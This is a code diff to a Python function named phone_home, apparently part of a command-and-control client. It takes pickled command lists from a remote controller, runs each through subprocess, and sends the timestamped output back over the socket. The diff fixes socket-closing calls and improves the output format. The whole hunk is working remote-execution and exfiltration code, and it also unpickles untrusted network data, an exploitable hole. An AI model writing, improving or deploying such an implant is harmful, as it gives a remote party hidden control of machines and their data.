@@ -38,25 +38,28 @@ def phone_home():
         else:
             cmd = pickle.loads(data)
             if cmd == "refused" or None:
-                s.close
+                s.close()
                 s.shutdown
                 s = None
                 print("Dad isn't speaking with me...")
                 return
             else:
-                for c in cmd:
+                for c in cmd[1:]:
                     cmdarg = (c).split(" ")
                     try:
                         execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                     except:
                         FileNotFoundError
                     else:
-                        cmd_return = (str(c) + "\n" + str(execute.stdout))
+                        utctime = time.asctime(time.gmtime())
+                        cmd_return = str(cmd[0]) + ' | '
+                        cmd_return += str(utctime) + ' | ' + str(c)
+                        cmd_return += "\n" + str(execute.stdout) + "\n"
                         jar = pickle.dumps(cmd_return)
                         s.sendall(jar)
 
             print("Told dad all about", cmd, "!")
-    s.close
+    s.close()
     s.shutdown
     s = None
     return
